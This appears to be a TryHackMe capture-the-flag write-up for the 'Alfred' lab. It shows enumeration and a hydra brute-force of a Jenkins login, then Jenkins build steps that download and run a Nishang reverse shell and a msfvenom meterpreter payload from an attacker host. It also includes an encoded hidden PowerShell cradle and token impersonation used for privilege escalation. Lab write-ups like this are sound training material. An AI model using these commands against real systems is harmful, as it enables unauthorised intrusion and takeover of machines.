# Alfred

https://tryhackme.com/room/alfred

## Resources

- https://github.com/samratashok/nishang
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

## Scanning/Enumeration

### nmap

```sh
nmap -v -T4 -sC -sV $TARGET_IP -Pn -oN nmap/scan.txt

# -v  - verbose
# -sC - default scripts
# -sV - version detect
# -p- - all ports
# -Pn - disable host discovery, only port scan
# -oN - output to file
```

Output to ![nmap/scan.txt](nmap/scan.txt)

- 80: http
  - Microsoft IIS httpd 7.5
- 3389
  - ssl/ms-wbt-server? 6.1.7601
- 8080: http
  - Jetty 9.4.z-SNAPSHOT
- system: alfred
- OS: windows

### gobuster

```sh
gobuster dir --url http://$TARGET_IP:80 -w /usr/share/wordlists/dirb/common.txt
# nothing

gobuster dir --url http://$TARGET_IP:8080 -w /usr/share/wordlists/dirb/common.txt
# nothing
```

### Browser

`http://$TARGET_IP:80` => nothing interesting

`http://$TARGET_IP:8080` => Jenkins login panel

Interesting request headers:

- `X-Jenkins 2.190.1`
- `X-Hudson 1.395`

## Vulnerabilities

- [Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/19033)

## Exploit

### Jenkins Login

View network request on login. 

Form data: `j_username=test&j_password=test&from=%2F&Submit=Sign+in`

```sh
# brute force with hydra

hydra -s 8080 $TARGET_IP http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" \
  -L /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt \
  -P /usr/share/wordlists/SecLists/Passwords/cirt-default-passwords.txt \
  -vV -f -w 30
# too long...

# google says jenkins default user is admin

hydra -s 8080 $TARGET_IP http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" \
  -l admin \
  -P /usr/share/wordlists/SecLists/Passwords/cirt-default-passwords.txt \
  -vV -f -w 30
# got it;  admin:admin

# cheatsheet:
#
# -s port
# -L use login file
# -P use password file
# -t tasks in parallel
# -w max wait seconds
```

Credentials: `admin:admin`

### Setup Reverse Shell

```sh
# attack box

# download exploit
curl -LJO https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

# serve up exploit (:8000)
python3 -m http.server

# listen for reverse shell
nc -lvnp 9000
```

```batch
REM  target
REM  Jenkins build step

WHOAMI
REM alfred\bruce

REM  download and execute reverse shell
POWERSHELL iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port 9000
```

```ps1
# target
# get flag

type C:\Users\bruce\Desktop\user.txt
```

### Setup Meterpreter Shell

```sh
# attacker

# generate payload
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f exe -o enki.exe

# serve payload
python3 -m http.server

# setup handler
msfconsole
use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $TARGET_IP
set LPORT 9000
run
```

```batch
REM  target

REM  download reverse shell
POWERSHELL "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER_IP:8000/enki.exe','enki.exe')"

REM  start reverse shell
POWERSHELL Start-Process "enki.exe"
```

`exploit/multi/handler` wouldn't work...just hung. Looked up writeup

```sh
# attacker

msfconsole
use exploit/muilti/script/web_delivery
set LHOST $ATTACKER_IP
set LPORT 9000
set target 2
run
```

```ps1
# generated from metasploit, ran on target machine

powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAGYAWgBSAGsAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbABmAFoAUgBrAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbABmAFoAUgBrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANgAuADEALgAxADgAMQA6ADgAMAA4ADAALwAyAGoATABiAGQAcABnAFkAWABSAG8ALwBIAGQAeQBqAE0AQgBzAGoAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYALgAxAC4AMQA4ADEAOgA4ADAAOAAwAC8AMgBqAEwAYgBkAHAAZwBZAFgAUgBvACcAKQApADsA

# reverse shell popped on attacker
```

```sh
# attacker, meterpreter shell

execute -f cmd.exe -c -i
```

```batch
REM  attacker, meterpreter cmd
whoami /priv
```

```sh
# attacker, meterpreter shell

load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid

ps
migrate 668

execute -f cmd.exe -c -i
type C:\Windows\System32\Config\root.txt
```













